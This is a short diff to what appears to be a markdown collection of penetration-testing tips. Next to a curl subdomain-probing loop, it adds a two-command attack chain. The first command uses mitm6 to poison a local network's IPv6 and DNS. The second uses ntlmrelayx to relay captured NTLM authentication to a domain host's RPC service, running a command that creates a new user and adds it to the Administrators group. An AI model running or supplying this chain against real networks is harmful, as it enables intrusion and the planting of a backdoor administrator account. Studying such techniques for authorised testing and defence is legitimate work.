@@ -45,3 +45,13 @@ Bloodhound tip.
 ```
 cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
 ```
+
+### From Paul Seekamp @nullenc0de...
+
+SMB Signing enabled? NetBIOS and LLMNR disabled? Need another way in?
+
+```
+mitm6 -i eth0 -d example.local
+
+ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user nullenc0de nullen0code_is_Here /add && net localgroup Administrators nullenc0de /add"
+```
